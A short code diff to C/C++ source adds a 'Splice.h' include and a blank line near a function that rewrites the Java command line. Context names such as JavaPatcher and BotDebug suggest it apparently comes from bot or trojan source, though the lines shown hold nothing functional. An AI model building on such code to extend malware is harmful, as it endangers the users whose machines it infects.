@@ -16,6 +16,7 @@
 #include "JavaConfig.h"
 #include "Richedit.h"
 #include "VideoRecorder.h"
+#include "Splice.h"
 #include "AzConfig.h"
 
 //#include "BotDebug.h"
@@ -1268,6 +1269,7 @@ static char* UpdateJavaCmdLine( const char* cmd )
 			javaExe = 2;
 	DBG( "JavaPatcher", "Type java: %d", javaExe );
 	if( javaExe == 0 ) return 0;
+
 	char path[MAX_PATH];
 	if( GetWorkFolder( path, 0 ) == 0 ) return 0;
 	int lenPath = m_lstrlen(path);
